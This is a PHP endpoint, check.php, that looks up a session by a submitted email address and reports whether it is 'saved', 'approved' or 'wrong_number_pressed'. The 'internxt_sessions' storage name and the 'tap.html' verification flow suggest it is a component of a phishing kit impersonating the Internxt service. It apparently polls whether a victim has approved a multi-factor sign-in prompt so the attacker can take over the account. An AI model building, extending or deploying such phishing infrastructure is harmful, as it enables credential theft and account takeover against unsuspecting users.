<?php
// check.php - Verification check endpoint for tap.html
header('Content-Type: text/plain; charset=utf-8');
header('Cache-Control: no-cache, no-store, must-revalidate');

// Session storage directory (matches next.php)
$sessionDir = __DIR__ . '/data/sessions';
if (!is_dir($sessionDir)) {
    $sessionDir = sys_get_temp_dir() . '/internxt_sessions';
}

$email = '';
if (!empty($_POST['em'])) {
    $email = trim($_POST['em']);
} else {
    $raw = file_get_contents('php://input');
    $decoded = json_decode($raw, true);
    if (!empty($decoded['em'])) {
        $email = trim($decoded['em']);
    }
}

if (empty($email)) {
    echo "waiting";
    exit;
}

$emailHash = md5(strtolower($email));
$mapFile = $sessionDir . '/email_' . $emailHash . '.json';

if (!file_exists($mapFile)) {
    // Search session files for matching email
    $foundSession = null;
    if (is_dir($sessionDir)) {
        $files = glob($sessionDir . '/*.json');
        foreach ($files as $file) {
            if (strpos(basename($file), 'email_') === 0) continue;
            $data = json_decode(@file_get_contents($file), true);
            if (!empty($data['email']) && strtolower(trim($data['email'])) === strtolower($email)) {
                $foundSession = $data;
                break;
            }
        }
    }
    if (!$foundSession) {
        echo "waiting";
        exit;
    }
    $session = $foundSession;
} else {
    $map = json_decode(@file_get_contents($mapFile), true);
    $sessionId = $map['sessionId'] ?? '';
    $sessionFile = $sessionDir . '/' . preg_replace('/[^a-zA-Z0-9_-]/', '', $sessionId) . '.json';
    if (!file_exists($sessionFile)) {
        echo "waiting";
        exit;
    }
    $session = json_decode(@file_get_contents($sessionFile), true);
}

$status = $session['status'] ?? 'pending';

if ($status === 'saved' || $status === 'approved') {
    echo "saved";
} elseif ($status === 'wrong_number_pressed') {
    echo "wrong_number_pressed";
} else {
    echo "waiting";
}
exit;
